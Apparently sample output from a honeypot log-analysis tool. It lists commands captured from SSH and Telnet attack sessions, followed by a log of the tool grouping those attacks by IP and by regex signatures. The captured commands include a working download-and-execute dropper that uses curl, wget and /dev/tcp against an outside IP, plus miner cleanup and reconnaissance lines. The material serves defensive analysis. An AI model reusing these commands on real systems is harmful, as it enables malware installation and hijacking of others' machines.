# hJPH+RnkZGiYZ+PleLiVc+fpKIR0aNmWw5TpCMTT9imYhBWYqYdjtJj4pBLXSGjEZAkJl9PFeNiEM7fJmPQVePmX0jSIeKVz9/n5BARoSefDxIip5NOm #
# KaikRZj5t8I0uKj0M7fJmOQVePmHojTIyQQDximo9GTYiYfT5Bno9IPGKcillGiJpiPEqKhE89fZqPV0aOnmI6TZCPSzVinopNQY6ZeDxZiI9XPHSYkE #
# BOkJp8NEOIjkg8foiKRVmPkX8jSIyKVzV+kohHRoqdbDxLjJBLP3qGik5ZjJh+N0+Oj0k+bJGKWUaNmWI8SYqQSz16kohHRo2bejLf/tBaGacj3bJ3jA #
# 3v4Q==',                                                                                                             #
#  'cp /tmp/UVPRQdahjX /tmp/linux',                                                                                    #
#  'head -c 0 > /tmp/winminer_sign',                                                                                   #
#  'head -c 0 > /tmp/winminer',                                                                                        #
#  'head -c 0 > /tmp/linux_sign',                                                                                      #
#  'head -c 0 > /tmp/mipsel_linux_sign',                                                                               #
#  'head -c 0 > /tmp/mips_linux',                                                                                      #
#  'head -c 0 > /tmp/mips_linux_sign',                                                                                 #
#  'head -c 0 > /tmp/windows_sign',                                                                                    #
#  'head -c 0 > /tmp/arm_linux_sign',                                                                                  #
#  'head -c 0 > /tmp/miner',                                                                                           #
#  'head -c 0 > /tmp/mipsel_linux',                                                                                    #
#  'head -c 0 > /tmp/windows',                                                                                         #
#  'head -c 0 > /tmp/arm_linux',                                                                                       #
#  'head -c 0 > /tmp/miner_sign',                                                                                      #
#  '',                                                                                                                 #
#  'exit']                                                                                                             #
#                                                                                                                      #
########################################################################################################################



Attack (chash: 1ae2a0aa7da872071305a1170015dfebfd7e40ebb8cb16a15979522836b53687), SourceIPs: 4, Sessions: 4, SSH: 4, Commands: 8, Cmdlogs: 1, 
##################################################################################
#                                    commands                                    #
##################################################################################
#                                                                                #
# ['/ip cloud print',                                                            #
#  'ifconfig',                                                                   #
#  'uname -a',                                                                   #
#  'cat /proc/cpuinfo',                                                          #
#  "ps | grep '[Mm]iner'",                                                       #
#  "ps -ef | grep '[Mm]iner'",                                                   #
#  'ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log '    #
#  '/etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman ' #
#  '/dev/modem* /var/config/sms/*',                                              #
#  'echo Hi | cat -n']                                                           #
#                                                                                #
##################################################################################



Attack (chash: ffd79baff1ac4708922e81990f239012311844465b35189b44c0fddb074c2a70), SourceIPs: 35, Sessions: 95, Telnet: 95, Commands: 8, Cmdlogs: 1, 
#############################################################
#                          commands                         #
#############################################################
#                                                           #
# ['sh',                                                    #
#  'shell',                                                 #
#  'enable',                                                #
#  'system',                                                #
#  'ping;sh',                                               #
#  'kill %%1',                                              #
#  '',                                                      #
#  '/bin/busybox cat /proc/self/exe || cat /proc/self/exe'] #
#                                                           #
#############################################################



Attack (chash: 4195b057b63b5e4a001d0c0a00bbf6941c8cc293114f7e55fd5f4a286b66f9bb), SourceIPs: 1, Sessions: 2, SSH: 2, Commands: 7, Cmdlogs: 2, 
########################################################################################################################
#                                                       commands                                                       #
########################################################################################################################
#                                                                                                                      #
# ['echo 1 && cat /bin/echo',                                                                                          #
#  'nohup $SHELL -c "curl http://50.17.152.237:60129/linux -o /tmp/6PzNqU3WQU; '                                       #
#  'if [ ! -f /tmp/6PzNqU3WQU ]; then wget http://50.17.152.237:60129/linux -O '                                       #
#  '/tmp/6PzNqU3WQU; fi; if [ ! -f /tmp/6PzNqU3WQU ]; then exec '                                                      #
#  "6<>/dev/tcp/50.17.152.237/60129 && echo -n 'GET /linux' >&6 && cat 0<&6 > "                                        #
#  '/tmp/6PzNqU3WQU && chmod +x /tmp/6PzNqU3WQU && /tmp/6PzNqU3WQU '                                                   #
#  '8YlPpUBWpU6enoSaUKVPSa5ImYGAm16nQFahS4eJiIdPpk5Cok6YgoeJT61LVqVOn56Bnkq6SU2nRJ+AgZpMtElJrFCbhYGHR6FWSadOk4aAmEymWE #
# C6TJuCnphGrVZJpk6ThoCYTKxYSaxMh4iGh0+sQFahRJ+AgZpHtElKpFCeiJ6QTrpJTaxEn4CBmEu0SUmhUJuDgYdPpUxWpUabioaZT6VAWKVMmJ6Cm1 #
# CmTUi6TJuKhplPpEBYpUydnoKbTrpNTLpPnIqGmU+mQVilTJ2egptMuklMo1Cch4qfTqVJS7RPm4Sem0ynVkmhUJiFiJNIpElKpV6YiIKHRqJWSaxGh4 #
# aKn06lSky0T5iFnptNpVZJpUqHgYibRKJISadHiYWAh0+jVkmhTIeCg55EokhJpkeJgYKZUKZKTLpPnYOemE2gQk6kT5qEkJhPoFZNoVCYgoWHT6NLQq #
# JOmIKDiU+lS1amTpmegplMuklLpkSfgIGZR7RMT7pPmYWemk26SU6uSJmBgJFeokpWo0yHhYeHTKZAQqJOmICGiU+mSVagToeBhp5QpUhKrkiZgYKcXq #
# VKTLpMm4Cemkm6QU6uSJmBg51eoE9WrUiHgYWdUKVNT65ImYGCnF6nQValTpyegphHuklIrUSfgIGZS7RJSKNQmISIh0ukVkqkRJ+AgZhNtElKpFCbgo #
# SHT6BLVqVNnYqGmU+nTFimT5CegZ1LuklLp1CcgYqfTqVLT7RKnp6BmEu6SkmhUJ2Iip9OpUhLtE+bgJ6eRrpBSLpPnIiKn06lSU20Sp6eiZtQpUhJuk #
# yZg4qfTqVJTJaLQfaP92I/Iia/tQ==; '                                                                                    #
#  'fi; echo 12345678 > /tmp/.opass; chmod +x /tmp/6PzNqU3WQU && /tmp/6PzNqU3WQU '                                     #
#  '8YlPpUBWpU6enoSaUKVPSa5ImYGAm16nQFahS4eJiIdPpk5Cok6YgoeJT61LVqVOn56Bnkq6SU2nRJ+AgZpMtElJrFCbhYGHR6FWSadOk4aAmEymWE #
# C6TJuCnphGrVZJpk6ThoCYTKxYSaxMh4iGh0+sQFahRJ+AgZpHtElKpFCeiJ6QTrpJTaxEn4CBmEu0SUmhUJuDgYdPpUxWpUabioaZT6VAWKVMmJ6Cm1 #
# CmTUi6TJuKhplPpEBYpUydnoKbTrpNTLpPnIqGmU+mQVilTJ2egptMuklMo1Cch4qfTqVJS7RPm4Sem0ynVkmhUJiFiJNIpElKpV6YiIKHRqJWSaxGh4 #
# aKn06lSky0T5iFnptNpVZJpUqHgYibRKJISadHiYWAh0+jVkmhTIeCg55EokhJpkeJgYKZUKZKTLpPnYOemE2gQk6kT5qEkJhPoFZNoVCYgoWHT6NLQq #
# JOmIKDiU+lS1amTpmegplMuklLpkSfgIGZR7RMT7pPmYWemk26SU6uSJmBgJFeokpWo0yHhYeHTKZAQqJOmICGiU+mSVagToeBhp5QpUhKrkiZgYKcXq #
# VKTLpMm4Cemkm6QU6uSJmBg51eoE9WrUiHgYWdUKVNT65ImYGCnF6nQValTpyegphHuklIrUSfgIGZS7RJSKNQmISIh0ukVkqkRJ+AgZhNtElKpFCbgo #
# SHT6BLVqVNnYqGmU+nTFimT5CegZ1LuklLp1CcgYqfTqVLT7RKnp6BmEu6SkmhUJ2Iip9OpUhLtE+bgJ6eRrpBSLpPnIiKn06lSU20Sp6eiZtQpUhJuk #
# yZg4qfTqVJTJaLQfaP92I/Iia/tQ==" '                                                                                    #
#  '&',                                                                                                                #
#  'head -c 2008180 > /tmp/897ArpbwVr',                                                                                #
#  'nohup $SHELL -c "curl http://50.17.152.237:60129/linux -o /tmp/6PzNqU3WQU; '                                       #
#  'if [ ! -f /tmp/6PzNqU3WQU ]; then wget http://50.17.152.237:60129/linux -O '                                       #
#  '/tmp/6PzNqU3WQU; fi; if [ ! -f /tmp/6PzNqU3WQU ]; then exec '                                                      #
#  "6<>/dev/tcp/50.17.152.237/60129 && echo -n 'GET /linux' >&6 && cat 0<&6 > "                                        #
#  '/tmp/6PzNqU3WQU && chmod +x /tmp/6PzNqU3WQU && /tmp/6PzNqU3WQU '                                                   #
#  '8YlPpUBWpU6enoSaUKVPSa5ImYGAm16nQFahS4eJiIdPpk5Cok6YgoeJT61LVqVOn56Bnkq6SU2nRJ+AgZpMtElJrFCbhYGHR6FWSadOk4aAmEymWE #
# C6TJuCnphGrVZJpk6ThoCYTKxYSaxMh4iGh0+sQFahRJ+AgZpHtElKpFCeiJ6QTrpJTaxEn4CBmEu0SUmhUJuDgYdPpUxWpUabioaZT6VAWKVMmJ6Cm1 #
# CmTUi6TJuKhplPpEBYpUydnoKbTrpNTLpPnIqGmU+mQVilTJ2egptMuklMo1Cch4qfTqVJS7RPm4Sem0ynVkmhUJiFiJNIpElKpV6YiIKHRqJWSaxGh4 #
# aKn06lSky0T5iFnptNpVZJpUqHgYibRKJISadHiYWAh0+jVkmhTIeCg55EokhJpkeJgYKZUKZKTLpPnYOemE2gQk6kT5qEkJhPoFZNoVCYgoWHT6NLQq #
# JOmIKDiU+lS1amTpmegplMuklLpkSfgIGZR7RMT7pPmYWemk26SU6uSJmBgJFeokpWo0yHhYeHTKZAQqJOmICGiU+mSVagToeBhp5QpUhKrkiZgYKcXq #
# VKTLpMm4Cemkm6QU6uSJmBg51eoE9WrUiHgYWdUKVNT65ImYGCnF6nQValTpyegphHuklIrUSfgIGZS7RJSKNQmISIh0ukVkqkRJ+AgZhNtElKpFCbgo #
# SHT6BLVqVNnYqGmU+nTFimT5CegZ1LuklLp1CcgYqfTqVLT7RKnp6BmEu6SkmhUJ2Iip9OpUhLtE+bgJ6eRrpBSLpPnIiKn06lSU20Sp6eiZtQpUhJuk #
# yZg4qfTqVJTJaLQfaP92I/Iia/tQ==; '                                                                                    #
#  'fi; echo 12345678 > /tmp/.opass; chmod +x /tmp/6PzNqU3WQU && /tmp/6PzNqU3WQU '                                     #
#  '8YlPpUBWpU6enoSaUKVPSa5ImYGAm16nQFahS4eJiIdPpk5Cok6YgoeJT61LVqVOn56Bnkq6SU2nRJ+AgZpMtElJrFCbhYGHR6FWSadOk4aAmEymWE #
# C6TJuCnphGrVZJpk6ThoCYTKxYSaxMh4iGh0+sQFahRJ+AgZpHtElKpFCeiJ6QTrpJTaxEn4CBmEu0SUmhUJuDgYdPpUxWpUabioaZT6VAWKVMmJ6Cm1 #
# CmTUi6TJuKhplPpEBYpUydnoKbTrpNTLpPnIqGmU+mQVilTJ2egptMuklMo1Cch4qfTqVJS7RPm4Sem0ynVkmhUJiFiJNIpElKpV6YiIKHRqJWSaxGh4 #
# aKn06lSky0T5iFnptNpVZJpUqHgYibRKJISadHiYWAh0+jVkmhTIeCg55EokhJpkeJgYKZUKZKTLpPnYOemE2gQk6kT5qEkJhPoFZNoVCYgoWHT6NLQq #
# JOmIKDiU+lS1amTpmegplMuklLpkSfgIGZR7RMT7pPmYWemk26SU6uSJmBgJFeokpWo0yHhYeHTKZAQqJOmICGiU+mSVagToeBhp5QpUhKrkiZgYKcXq #
# VKTLpMm4Cemkm6QU6uSJmBg51eoE9WrUiHgYWdUKVNT65ImYGCnF6nQValTpyegphHuklIrUSfgIGZS7RJSKNQmISIh0ukVkqkRJ+AgZhNtElKpFCbgo #
# SHT6BLVqVNnYqGmU+nTFimT5CegZ1LuklLp1CcgYqfTqVLT7RKnp6BmEu6SkmhUJ2Iip9OpUhLtE+bgJ6eRrpBSLpPnIiKn06lSU20Sp6eiZtQpUhJuk #
# yZg4qfTqVJTJaLQfaP92I/Iia/tQ==" '                                                                                    #
#  '&#UPX!',                                                                                                           #
#  ">A@/`K'8ELF $K@",                                                                                                  #
#  '',                                                                                                                 #
#  'echo 1 && cat /bin/echo']                                                                                          #
#                                                                                                                      #
########################################################################################################################



Attack (chash: a55636347c67b3744e5bd21dede42f7de1db694a586d10ef47a9eb8d23d275f9), SourceIPs: 2, Sessions: 2, SSH: 2, Commands: 4, Cmdlogs: 1, 
#######################################################################
#                               commands                              #
#######################################################################
#                                                                     #
# ['sh',                                                              #
#  'shell',                                                           #
#  'enable',                                                          #
#  'cat /bin/echo||while read i; do echo $i; done < /proc/self/exe;'] #
#                                                                     #
#######################################################################

Honeypot AI Finished Successfully!    
    """,
    


    "organize_attacks": """
lucasfaudman@Lucass-MacBook-Pro testenv % honeypot-ai/run.sh -lfl  --organize-attacks --max-ips-per-attack 10
Starting honeypot-ai...

Loading attacks from logs directory at /Users/lucasfaudman/Documents/SANS/testenv/logs
Processing Events from Parser 1 of 2: <loganalyzers.logparser.CowrieParser object at 0x10fd0e050>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.ZeekParser object at 0x10fd0de50>
Removed e1f5ed39177c9c96bc2908f62e3b8915651ed440b76e325e8aadc0ff204e65b3 with ips {'172.31.5.68'}
(50->49) - Removed 1 attacks with ips ['216.243.47.166', '172.31.5.68', '54.67.87.80']
Attempting merge 7056: 8efd16cd5ab4e4100ac2e72d8845c76038fa6e18ca93a18a23ebd931485584a6 <- bf9f1cea82e8c27db2d85d4aa15cf2903a81c3bdd2ccfea3d7d6480c30041747 by malware_urls
Merged 0 attacks by out of 7056 attempts (0.0000%) 
Merge Attacks Time: 0.7443s
(49->49) - Merged 0 attacks with shared attrs
Regex merged b9a4719c49a20cdd0865db0216e3d4013b6961bcfc4d55f86b663a65b1e6dce1 into 28d2ac3befde61d0e429298eab1a7938c81935678d9169e177a674f741ca7c2e on http_requests: re.compile('GET /shell\\?cd\\+/tmp')
Regex merged a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 into a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 on commands: re.compile('cd ~; chattr -ia .ssh; lockr -ia .ssh')
Regex merged 5cf1c21aa6e8cbade37863a4773c61613f17cc41f7b6b9a00956c09270becf75 into 5cf1c21aa6e8cbade37863a4773c61613f17cc41f7b6b9a00956c09270becf75 on commands: re.compile('cat /proc/mounts; /bin/busybox [\\w\\d]+')
Regex merged 8f3dff1e7b287ae12972828278c29796dd85dbae1b18b29ed81fc839ecd93695 into 8f3dff1e7b287ae12972828278c29796dd85dbae1b18b29ed81fc839ecd93695 on commands: re.compile(">\\??A@/ ?X'8ELFX")
Regex merged 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 into 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c on commands: re.compile('cd /tmp && chmod \\+x [\\w\\d]+ && bash -c ./[\\w\\d]+')
Regex merged b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f into 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c on commands: re.compile('cd /tmp && chmod \\+x [\\w\\d]+ && bash -c ./[\\w\\d]+')
Regex merged c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 into a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 on commands: re.compile('cd ~; chattr -ia .ssh; lockr -ia .ssh')
(49->42) - Merged 7 attacks with shared sig regexes
Skipping attack ffd79baff1ac4708922e81990f239012311844465b35189b44c0fddb074c2a70 with 35 IPs (max_ips_per_attack=10)
Skipping attack 85eb37329ba115f18c3f60c8d979b23f56a9bb38b35e5cf19d544e12b5b2bbc8 with 14 IPs (max_ips_per_attack=10)
Organizing attacks into attack directories at /Users/lucasfaudman/Documents/SANS/testenv/attacks
Prepared regex pattern: b'(35\\.85\\.244\\.164|35\\.85\\.237\\.231|44\\.229\\.31\\.222|44\\.233\\.198\\.138|54\\.187\\.66\\.79|3\\.238\\.240\\.225|194\\.67\\.201\\.41|54\\.222\\.143\\.33|52\\.80\\.229\\.231|52\\.81\\.27\\.255|103\\.163\\.215\\.12|164\\.90\\.163\\.107|49\\.234\\.50\\.52|44\\.207\\.239\\.204|128\\.199\\.218\\.182|143\\.198\\.46\\.19|128\\.199\\.22\\.193|59\\.4\\.55\\.180|103\\.130\\.189\\.246|113\\.111\\.174\\.87|182\\.31\\.217\\.18|150\\.158\\.27\\.38|182\\.72\\.219\\.186|66\\.240\\.205\\.34|104\\.237\\.135\\.225|192\\.155\\.86\\.241|23\\.92\\.24\\.103|72\\.14\\.181\\.67|117\\.190\\.226\\.115|222\\.111\\.179\\.159|31\\.208\\.22\\.102|73\\.43\\.215\\.50|18\\.138\\.212\\.58|18\\.116\\.202\\.221|13\\.250\\.8\\.18|185\\.180\\.143\\.49|45\\.156\\.129\\.2|185\\.180\\.143\\.141|164\\.92\\.192\\.25|134\\.122\\.89\\.242|138\\.68\\.163\\.10|68\\.69\\.186\\.30|45\\.142\\.182\\.77|91\\.92\\.243\\.232|93\\.223\\.169\\.159|27\\.93\\.25\\.111|111\\.216\\.194\\.148|172\\.104\\.228\\.72|93\\.123\\.85\\.82|91\\.92\\.243\\.65|202\\.90\\.136\\.204|149\\.127\\.191\\.44|91\\.92\\.249\\.164|94\\.156\\.65\\.188|192\\.227\\.146\\.253|123\\.99\\.201\\.37|221\\.160\\.138\\.230|112\\.168\\.208\\.76|41\\.160\\.238\\.201|218\\.145\\.61\\.20|188\\.166\\.224\\.136|91\\.92\\.243\\.167|185\\.224\\.128\\.191|185\\.180\\.143\\.80|23\\.20\\.205\\.139|43\\.135\\.123\\.64|43\\.132\\.196\\.160|20\\.197\\.51\\.98|103\\.121\\.39\\.54|120\\.63\\.180\\.123|47\\.105\\.33\\.16|102\\.37\\.103\\.237|45\\.95\\.147\\.236|47\\.120\\.37\\.43|14\\.41\\.43\\.78|62\\.171\\.167\\.21|3\\.93\\.0\\.214|103\\.85\\.95\\.36|95\\.214\\.53\\.103|193\\.32\\.162\\.174|172\\.98\\.33\\.206|188\\.166\\.174\\.44|178\\.72\\.69\\.244|95\\.214\\.53\\.99)'
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/7ea3ab134f5340790a7a9d64915c9aa8418f3c9707cff0ab76b2ce4e33da9656/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/7ab552f01de999cb12092166cdc36fd68a0edbb33927e0ef3d26f4ee6449f804/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/28ba533b0f3c4df63d6b4a5ead73860697bdf735bb353e4ca928474889eb8a15/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/1bd476ad78c1f8fd54963653f838e608ef25d8a0a9e84a54fcd1b3889ada6fae/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/1ae2a0aa7da872071305a1170015dfebfd7e40ebb8cb16a15979522836b53687/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/0ad0d02f9c317f120457c60054218fe8e53c3ed63546ef9681986d143a49a518/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/2052f501395004cd5eadfe6b8e9fba9d0be7b1c31f9864e9eb68d3490a5d3c55/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/51e82af9c7a10e0c74d49799d1344fd73a08d95cee17a9b7ed1644e981905f13/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/6536b48b9a0b55e0ce90043b2eb5bba229ac18ef6100a8b7f474318db4e11db1/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/0c5e35708d1ddce35bd8d2c3ec1a04a2ecaa2ec203071d00591afa6f24f01f98/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/eafdc691c2945a067fa5de7bac393326241395a9cd11bc6737c7191859f13b80/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/6ef6eba782945c5c6d677a2ea8e1fc8320bfae6eb3800f5e7888c3b266479f00/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/846f2a6c936a5c60bf416fa277a315d852da3ed0f52d2c9e22aca882ad3e17d2/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/a55636347c67b3744e5bd21dede42f7de1db694a586d10ef47a9eb8d23d275f9/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/28d2ac3befde61d0e429298eab1a7938c81935678d9169e177a674f741ca7c2e/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/50758fb09c87e81299ba39f366474396f6eb9a82068707505780307a7021ccd2/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/7da13397216e915d3648622960fa18ea26295ad5f180cf1346511991dc689ea9/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/ffc86c13c2614123fced454ae877687ceae7759a81df85d61960f7c2079faf59/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/4da3ee2625bb069ebb113ec1ce45b4f5b8ec39e3e743330b94f6c15e4c25f84a/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/ed38805b5dd55c277dcbebb9c4db218b036f9cae287ba106cc774ec3da18bfcf/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/79cee4cdd57b016e9a6cdc9b23385b110da33ec808b64670bcf45b0661db1a65/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/0b60b47c6cbbec8f0c44289158db12490185b6ef821e8b1946a745c8b300ac67/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/f9a22a65178153d25e6a84189570709a0aced94197404093eff5cea464b865ac/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/a23e9121e296bd9ba20a37c2cc6f2fab5285e2f6efd635841d835724544d6758/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/bc816b9b031183662a273fbc558312d1b2950f19a0d2d91345474a152011f6bf/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/4195b057b63b5e4a001d0c0a00bbf6941c8cc293114f7e55fd5f4a286b66f9bb/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/3c9d7241372c627d30ffb3a9868fbf4c4fc2ec4b0c4e0ac7909ddfcefc6bcaf9/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/30d72557f4e8b64fba88e86ce784ac08339fca517863f30d194830c90ff72a01/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/c4927e4103e250b181e76582991f71a7a3987ccae02ad1fc8cff377e65871199/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/bf9f1cea82e8c27db2d85d4aa15cf2903a81c3bdd2ccfea3d7d6480c30041747/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/11d146661a0270a1b386d4deb731a582304e4ef28ab7d59c2d076547cb16c8d1/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/3b6819f4180302fda913f82fcc8c8b4de5370e7d761872207a5dbf0cc2f750f7/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/d9e9714edf4333cdaeeaa837d3542451931a587a47d48afce527cfc81ea8e144/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/2b5bfc8daca85f59084e942c25bd635e6519a07f1e2847fd8c6af18038c608a6/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/f9c78e80544b19ef2c5ee00ca276136cbfdd61d5ae8cfbd904e1b5adbd66830d/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/a66a6d7f44765043006458e840366d2331e12ec7361c05f002dfab81a9e95060/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/63a01ec266fce76ebdb77cc72df4d2adde52f742d7f02204eb0a302b71378a88/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/801f77ad815592be4a10b2c6b624d2f93117eb141fb2fc3cef008cce6c496ade/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/8efd16cd5ab4e4100ac2e72d8845c76038fa6e18ca93a18a23ebd931485584a6/auth_random.json
Done preparing dirs for 40 attacks
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/auth_random.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/auth_random.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-02-01.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-31.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-31.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-27.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-26.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-02-01.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-30.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-30.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-27.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-29.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-26.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-28.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-29.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-31.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-31.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-30.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-30.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-26.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-27.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-29.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-02-02.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-26.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-28.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-27.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-29.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-02-02.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-02-01.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-02-02.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-21.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-28.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-21.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-02-02.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-20.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-27.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-02-01.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-02-01.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-02-01.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-26.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-27.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-30.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-25.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-28.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-02-03.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-25.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-29.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-26.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-28.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-02-03.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-28.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-02-02.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-24.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-23.json
